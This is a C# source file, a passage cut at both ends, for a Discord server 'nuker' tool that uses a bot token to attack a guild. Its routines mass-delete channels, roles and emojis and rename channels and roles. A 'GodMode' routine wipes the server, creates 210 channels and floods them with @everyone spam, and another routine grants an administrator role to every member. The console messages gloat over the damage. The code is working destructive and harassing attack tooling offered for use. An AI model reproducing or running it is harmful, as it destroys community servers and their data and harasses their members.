                                Console.ResetColor();
                                break;
                            }
                        }
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Done! Channels Renamed: {renamed}");
            return;
        }

        static async Task CreateRoleAsync()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("ROLE NAME: ");
            Console.ResetColor();
            var name = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("COUNT: ");
            Console.ResetColor();
            if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid Number.");
                Console.ResetColor();
                return;
            }

            var tasks = new List<Task>();
            int roleCount = 0;

            for (int i = 0; i < count; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    var payload = new { name = name };
                    var contentJson = JsonConvert.SerializeObject(payload);
                    var content = new StringContent(contentJson, Encoding.UTF8, "application/json");

                    try
                    {
                        var response = await client.PostAsync($"https://discord.com/api/v10/guilds/{guildId}/roles", content);

                        if (response.IsSuccessStatusCode)
                        {
                            Interlocked.Increment(ref roleCount);

                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.WriteLine($"Created: {name}");
                            Console.ResetColor();
                        }
                        else
                        {
                            var error = await response.Content.ReadAsStringAsync();
                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.WriteLine($"Failed To Create {name}: {error}");
                            Console.ResetColor();
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine($"Error Creating {name}: {ex.Message}");
                        Console.ResetColor();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Finished Role Creation: {roleCount}");
            Console.ResetColor();
            return;
        }

        static async Task RenameAllRoles()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("NEW NAME: ");
            Console.ResetColor();
            string? newRoleName = Console.ReadLine();

            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/roles");

            if (!response.IsSuccessStatusCode)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Failed to fetch roles: {await response.Content.ReadAsStringAsync()}");
                return;
            }

            var json = await response.Content.ReadAsStringAsync();
            dynamic? roles = JsonConvert.DeserializeObject(json);

            var semaphore = new SemaphoreSlim(5); // Max 5 at once
            var tasks = new List<Task>();
            int renamed = 0;

            if (roles == null)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("Failed to deserialize roles.");
                return;
            }

            foreach (var role in roles)
            {
                string roleId = role.id;
                string roleName = role.name;

                // Optionally skip @everyone role
                if ((bool)role.managed || (string)role.name == "@everyone") continue;

                tasks.Add(Task.Run(async () =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        int retries = 5;
                        while (retries-- > 0)
                        {
                            var url = $"https://discord.com/api/v10/guilds/{guildId}/roles/{roleId}";
                            var payload = new { name = newRoleName };
                            var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                            var result = await client.PatchAsync(url, content);

                            if (result.IsSuccessStatusCode)
                            {
                                Interlocked.Increment(ref renamed);
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Renamed role: {roleName} → {newRoleName}");
                                break;
                            }
                            else if ((int)result.StatusCode == 429)
                            {
                                var errorData = JsonConvert.DeserializeObject<dynamic>(await result.Content.ReadAsStringAsync());
                                double retryAfter = (errorData?.retry_after != null) ? (double)errorData.retry_after : 1.0;
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Rate limited on role {roleName}, waiting {retryAfter * 1000}ms...");
                                await Task.Delay((int)(retryAfter * 1000));
                                break;
                            }
                        }
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Done! Roles Renamed: {renamed}");
            Console.ResetColor();
            return;
        }

        static async Task ShuffleAllChannels()
        {
            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/channels");

            if (!response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Failed to fetch channels: {await response.Content.ReadAsStringAsync()}");
                return;
            }

            var json = await response.Content.ReadAsStringAsync();
            dynamic? channels = JsonConvert.DeserializeObject(json);
            if (channels == null)
            {
                Console.WriteLine("Failed to deserialize channels.");
                return;
            }

            var random = new Random();
            var semaphore = new SemaphoreSlim(5); // Max 5 in parallel
            var tasks = new List<Task>();
            int changed = 0;

            foreach (var channel in channels)
            {
                string channelId = channel.id;
                string oldName = channel.name;

                // Only rename text and voice channels
                string type = channel.type.ToString();
                if (type != "0" && type != "2") continue; // 0 = text, 2 = voice

                // Generate a random name
                string newName = $"channel-{random.Next(1000, 9999)}";

                tasks.Add(Task.Run(async () =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        int retries = 5;
                        while (retries-- > 0)
                        {
                            var url = $"https://discord.com/api/v10/channels/{channelId}";
                            var payload = new { name = newName };
                            var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                            var result = await client.PatchAsync(url, content);

                            if (result.IsSuccessStatusCode)
                            {
                                Interlocked.Increment(ref changed);
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Renamed {oldName} → {newName}");
                                break;
                            }
                            else if ((int)result.StatusCode == 429)
                            {
                                string errorJson = await result.Content.ReadAsStringAsync();
                                double retryAfter = 1.0;

                                if (!string.IsNullOrWhiteSpace(errorJson))
                                {
                                    var errorData = JsonConvert.DeserializeObject<JObject>(errorJson);
                                    var retryToken = errorData?["retry_after"];
                                    if (retryToken != null && double.TryParse(retryToken.ToString(), out double parsedRetry))
                                    {
                                        retryAfter = parsedRetry;
                                    }
                                }
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Rate limited on {oldName}, waiting {retryAfter * 1000}ms...");
                                await Task.Delay((int)(retryAfter * 1000));
                                break;
                            }

                        }
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Done! Channels Renamed: {changed}");
            Console.ResetColor();
            return;
        }

        static async Task DeleteAllChannels()
        {
            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/channels");

            var json = await response.Content.ReadAsStringAsync();
            var channels = JsonConvert.DeserializeObject<JArray>(json);

            var deleteTasks = new List<Task>();
            int deletedCount = 0;

            if (channels != null)
            {
                foreach (var channel in channels)
                {
                    string? channelId = channel["id"]?.ToString();
                    string? channelName = channel["name"]?.ToString();

                    if (string.IsNullOrWhiteSpace(channelId) || string.IsNullOrWhiteSpace(channelName))
                        continue;

                    deleteTasks.Add(Task.Run(async () =>
                    {
                        var deleteResponse = await client.DeleteAsync($"https://discord.com/api/v10/channels/{channelId}");
                        if (deleteResponse.IsSuccessStatusCode)
                        {
                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.WriteLine($"Deleted: {channelName} ({channelId})");
                            Interlocked.Increment(ref deletedCount);
                        }
                    }));
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("Failed to deserialize channel list.");
            }


            await Task.WhenAll(deleteTasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Deleted Channels: {deletedCount}");
            Console.ResetColor();
            return;
        }

        static async Task DeleteAllRoles()
        {
            int totalDeleted = 0;
            var throttle = new SemaphoreSlim(20);
            var failedIds = new HashSet<string>();

            try
            {
                var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/roles");
                var json = await response.Content.ReadAsStringAsync();
                dynamic? roles = JsonConvert.DeserializeObject(json);
                if (roles == null)
                {
                    Console.WriteLine("Failed to deserialize roles.");
                    return;
                }

                var deletableRoles = new List<(string id, string name)>();
                foreach (var role in roles)
                {
                    string roleId = role.id;
                    string roleName = role.name;
                    if (roleId != guildId) // Skip @everyone role
                        deletableRoles.Add((roleId, roleName));
                }

                var tasks = deletableRoles.Select(role =>
                    Task.Run(async () =>
                    {
                        if (failedIds.Contains(role.id))
                            return;

                        await throttle.WaitAsync();
                        try
                        {
                            var deleteResp = await client.DeleteAsync($"https://discord.com/api/v10/guilds/{guildId}/roles/{role.id}");
                            if (deleteResp.IsSuccessStatusCode)
                            {
                                Interlocked.Increment(ref totalDeleted);
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Deleted Role: {role.name} ({role.id})");
                            }
                            else if ((int)deleteResp.StatusCode == 403) // Forbidden
                            {
                                lock (failedIds)
                                    failedIds.Add(role.id);
                            }
                        }
                        catch { }
                        finally { throttle.Release(); }
                    }));

                await Task.WhenAll(tasks);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[ERROR] {ex.Message}");
                Console.ResetColor();
            }
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Roles deleted: {totalDeleted}. Skipped (Forbidden): {failedIds.Count}");
            Console.ResetColor();
            return;
        }

        static async Task DeleteAllEmojis()
        {
            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/emojis");

            if (!response.IsSuccessStatusCode)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Failed to fetch emojis: {await response.Content.ReadAsStringAsync()}");
                return;
            }

            var json = await response.Content.ReadAsStringAsync();
            var emojis = JsonConvert.DeserializeObject<JArray>(json);

            if (emojis == null)
            {
                Console.WriteLine(" Failed to deserialize emojis.");
                return;
            }

            int deleted = 0;
            var semaphore = new SemaphoreSlim(5);
            var tasks = new List<Task>();

            foreach (var emoji in emojis)
            {
                string? emojiId = emoji["id"]?.ToString();
                string? emojiName = emoji["name"]?.ToString();

                if (string.IsNullOrWhiteSpace(emojiId) || string.IsNullOrWhiteSpace(emojiName))
                    continue;

                tasks.Add(Task.Run(async () =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        int retries = 5;
                        while (retries-- > 0)
                        {
                            var result = await client.DeleteAsync($"https://discord.com/api/v10/guilds/{guildId}/emojis/{emojiId}");

                            if (result.IsSuccessStatusCode)
                            {
                                Interlocked.Increment(ref deleted);
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Deleted Emoji: {emojiName} ({emojiId})");
                                break;
                            }
                            else if ((int)result.StatusCode == 429)
                            {
                                string retryJson = await result.Content.ReadAsStringAsync();
                                var error = JsonConvert.DeserializeObject<JObject>(retryJson);
                                double retryAfter = error?["retry_after"]?.ToObject<double>() ?? 1.0;

                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Rate limited deleting {emojiName}. Waiting {retryAfter * 1000}ms...");
                                await Task.Delay((int)(retryAfter * 1000));
                                break;
                            }
                        }
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Done! Emojis Deleted: {deleted}");
            return;
        }

        static async Task GetInviteLink()
        {
            // Fetch available channels
            var resp = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/channels");
            if (!resp.IsSuccessStatusCode)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Failed to fetch channels.");
                Console.ResetColor();
                return;
            }

            var json = await resp.Content.ReadAsStringAsync();
            var channels = JsonConvert.DeserializeObject<JArray>(json);

            if (channels == null)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Failed to deserialize channels.");
                return;
            }

            string? channelId = null;
            foreach (var channel in channels)
            {
                int? type = channel["type"]?.ToObject<int>();
                if (type == 0)
                {
                    channelId = channel["id"]?.ToString();
                    if (!string.IsNullOrWhiteSpace(channelId))
                        break;
                }
            }

            if (string.IsNullOrWhiteSpace(channelId))
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"No text channel found to create an invite.");
                Console.ResetColor();
                return;
            }

            // Create invite
            var content = new StringContent("{}", Encoding.UTF8, "application/json");
            var inviteResp = await client.PostAsync($"https://discord.com/api/v10/channels/{channelId}/invites", content);

            if (!inviteResp.IsSuccessStatusCode)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Failed to create invite.");
                Console.ResetColor();
                return;
            }

            var inviteJson = await inviteResp.Content.ReadAsStringAsync();
            var inviteData = JsonConvert.DeserializeObject<JObject>(inviteJson);
            string? inviteCode = inviteData?["code"]?.ToString();

            if (string.IsNullOrWhiteSpace(inviteCode))
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Failed to get invite code from response.");
                Console.ResetColor();
                return;
            }

            string inviteUrl = $"https://discord.gg/{inviteCode}";

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Invite Link : ");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine($"({inviteUrl})");

        }

        static void GetBotInviteLink()
        {
            try
            {
                string inviteUrl = $"https://discord.com/api/oauth2/authorize?client_id={botId}&permissions=8&scope=bot";
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write($"Bot Invite Link : ");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine($"({inviteUrl})");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Failed to generate invite link : {ex.Message}");
                Console.ResetColor();
            }
        }

        static async Task GodMode()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("GOD MODE INITIATED...");
            Console.ResetColor();

            var renameContent = new StringContent(JsonConvert.SerializeObject(new
            {
                name = "Allah Hu Akbar"
            }), Encoding.UTF8, "application/json");

            var renameRes = await client.PatchAsync($"https://discord.com/api/v10/guilds/{guildId}", renameContent);
            if (renameRes.IsSuccessStatusCode)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("You Just Fucked That Server So Bad");
            }

            var rolesRes = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/roles");
            if (rolesRes.IsSuccessStatusCode)
            {
                var rolesJson = await rolesRes.Content.ReadAsStringAsync();
                dynamic? roles = JsonConvert.DeserializeObject(rolesJson); // nullable dynamic
                if (roles == null)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("Failed to deserialize roles.");
                    return;
                }

                var deleteTasks = new List<Task>();
                foreach (var role in roles)
                {
                    if ((string)role.id != guildId)
                    {
                        deleteTasks.Add(client.DeleteAsync($"https://discord.com/api/v10/guilds/{guildId}/roles/{role.id}"));
                    }
                }

            }

            var channelsRes = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/channels");
            if (channelsRes.IsSuccessStatusCode)
            {
                var channelsJson = await channelsRes.Content.ReadAsStringAsync();
                var channels = JsonConvert.DeserializeObject<JArray>(channelsJson);

                var deleteTasks = new List<Task>();
                if (channels != null)
                {
                    foreach (var channel in channels)
                    {
                        string? channelId = channel["id"]?.ToString();
                        if (!string.IsNullOrWhiteSpace(channelId))
                        {
                            deleteTasks.Add(client.DeleteAsync($"https://discord.com/api/v10/channels/{channelId}"));
                        }
                    }

                    await Task.WhenAll(deleteTasks);
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("Failed to deserialize channels.");
                }
            }

            var createTasks = new List<Task<HttpResponseMessage>>();
            for (int i = 0; i < 210; i++)
            {
                var createContent = new StringContent(JsonConvert.SerializeObject(new
                {
                    name = "بِسْمِ اللهِ الرَّحْمٰنِ الرَّحِيْمِ",
                    type = 0
                }), Encoding.UTF8, "application/json");

                createTasks.Add(client.PostAsync($"https://discord.com/api/v10/guilds/{guildId}/channels", createContent));
            }

            var responses = await Task.WhenAll(createTasks);
            var createdChannelIds = new List<string>();

            foreach (var res in responses)
            {
                if (res.IsSuccessStatusCode)
                {
                    var json = await res.Content.ReadAsStringAsync();
                    var obj = JsonConvert.DeserializeObject<JObject>(json);

                    string? id = obj?["id"]?.ToString();
                    if (!string.IsNullOrWhiteSpace(id))
                    {
                        createdChannelIds.Add(id);
                    }
                }
            }

            // STEP 4: Spam Messages in Channels
            var spamTasks = new List<Task>();
            foreach (var id in createdChannelIds)
            {
                for (int i = 0; i < 5; i++)
                {
                    spamTasks.Add(client.PostAsync($"https://discord.com/api/v10/channels/{id}/messages", new StringContent(
                    JsonConvert.SerializeObject(new { content = "@everyone سْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِیْمِ\r\nاَلْحَمْدُ لِلّٰهِ رَبِّ الْعٰلَمِیْنَ الرَّحْمٰنِ الرَّحِیْمِ مٰلِكِ یَوْمِ الدِّیْنِﭤ اِیَّاكَ نَعْبُدُ وَ اِیَّاكَ نَسْتَعِیْنُﭤ اِهْدِنَا الصِّرَاطَ الْمُسْتَقِیْمَ صِرَاطَ الَّذِیْنَ اَنْعَمْتَ عَلَیْهِمْ ﴰ غَیْرِ الْمَغْضُوْبِ عَلَیْهِمْ وَ لَا الضَّآلِّیْنَ" }),
                    Encoding.UTF8, "application/json")));
                }

            }

            // STEP 5: Create 20 Roles named "OFF Server"
            var roleTasks = new List<Task>();
            for (int i = 0; i < 20; i++)
            {
                var roleContent = new StringContent(JsonConvert.SerializeObject(new
                {
                    name = "بِسْمِ اللهِ الرَّحْمٰنِ الرَّحِيْمِ"
                }), Encoding.UTF8, "application/json");

                roleTasks.Add(client.PostAsync($"https://discord.com/api/v10/guilds/{guildId}/roles", roleContent));
            }

            await Task.WhenAll(roleTasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"GOD MODE COMPLETED");
            Console.ResetColor();
            return;
        }

        public static async Task GrantEveryoneAdmin()
        {
            try
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("Enter User ID [Default = all]: ");
                Console.ResetColor();
                string? input = Console.ReadLine()?.Trim();

                var payload = new
                {
                    name = "TitanAdmin",
                    permissions = "8",
                    color = 16711680
                };

                var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                var createRoleResponse = await client.PostAsync($"https://discord.com/api/v10/guilds/{guildId}/roles", content);

                if (!createRoleResponse.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine($"Failed to create admin role.");
                    Console.ResetColor();
                    return;
                }

                var roleJson = await createRoleResponse.Content.ReadAsStringAsync();
                var role = JsonConvert.DeserializeObject<JObject>(roleJson);
                string? roleId = role?["id"]?.ToString();

                if (string.IsNullOrEmpty(roleId))
                {
                    return;
                }

                List<string> userIds = new();

                if (string.IsNullOrEmpty(input))
                {
                    var membersRes = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/members?limit=1000");
                    var membersJson = await membersRes.Content.ReadAsStringAsync();
                    var members = JsonConvert.DeserializeObject<JArray>(membersJson);

                    if (members == null)
                    {
                        return;
                    }

                    foreach (var member in members)
                    {
                        string? userId = member?["user"]?["id"]?.ToString();
                        if (!string.IsNullOrEmpty(userId) && userId != botId)
                        {
                            userIds.Add(userId);
                        }
                    }
                }
                else
                {
                    userIds.Add(input); // Only assign to specific user
                }

                // Fast parallel role assignment
                var tasks = userIds.Select(async userId =>
                {
                    var response = await client.PutAsync(
                        $"https://discord.com/api/v10/guilds/{guildId}/members/{userId}/roles/{roleId}", null);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine($"Got Admin ({userId})");
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine($"Failed to assign role to {userId}");
                    }
                    Console.ResetColor();
                });

                await Task.WhenAll(tasks);

            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[ERROR] {ex.Message}");
                Console.ResetColor();
            }
        }

        public static async Task ScanGuild()
        {
            if (string.IsNullOrWhiteSpace(guildId))
            {
                return;
            }

            try
            {
                var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}");

                if (!response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine($"Failed to fetch guild details: {await response.Content.ReadAsStringAsync()}");
                    Console.ResetColor();
                    return;
                }

                var json = await response.Content.ReadAsStringAsync();
                dynamic guild = JsonConvert.DeserializeObject(json)!;

                string name = guild.name;
                string ownerId = guild.owner_id;
                string id = guild.id;
                int memberCount = guild.approximate_member_count ?? 0;

                string icon = guild.icon;
                string inviteUrl = $"https://cdn.discordapp.com/icons/{guildId}/{icon}.png?size=512";
                int boostCount = guild.premium_subscription_count ?? 0;
                string boostTier = guild.premium_tier;
                string verification = guild.verification_level;
                string? vanityUrl = guild.vanity_url_code;

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] "); Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("Guild ID: "); Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine(id);

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("Guild Name: ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"{name}");

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("Guild Owner ID: ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"{ownerId}");

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("Member Count: ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"{memberCount}");

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("Icon URL: ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"{inviteUrl}");

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] "); Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("Boosts: "); Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"{boostCount} (Tier {boostTier})");

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] "); Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("Verification Level: "); Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine(verification);

                if (!string.IsNullOrEmpty(vanityUrl))
                {
                    string invite = $"https://discord.gg/{vanityUrl}";
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write($"[{DateTime.Now:HH:mm:ss}] "); Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("Vanity Invite: "); Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine(invite);
                }

                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Error while scanning guild: {ex.Message}");
                Console.ResetColor();
            }
        }
    }
}
static class ConsoleWindowManager
{
    const int SWP_NOSIZE = 0x0001;
    const int SWP_NOMOVE = 0x0002;
    const int SWP_NOZORDER = 0x0004;
    const int SWP_FRAMECHANGED = 0x0020;

    const int GWL_STYLE = -16;
    const int WS_SIZEBOX = 0x00040000;
    const int WS_MAXIMIZEBOX = 0x00010000;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern int GetWindowLong(IntPtr hWnd, int nIndex);

    [DllImport("user32.dll")]
    static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    [DllImport("user32.dll", SetLastError = true)]
    static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

    public static void LockConsoleSize()
    {
        IntPtr consoleWindow = GetConsoleWindow();
        int style = GetWindowLong(consoleWindow, GWL_STYLE);

        style &= ~WS_SIZEBOX;
        style &= ~WS_MAXIMIZEBOX;

        SetWindowLong(consoleWindow, GWL_STYLE, style);

        SetWindowPos(consoleWindow, IntPtr.Zero, 0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
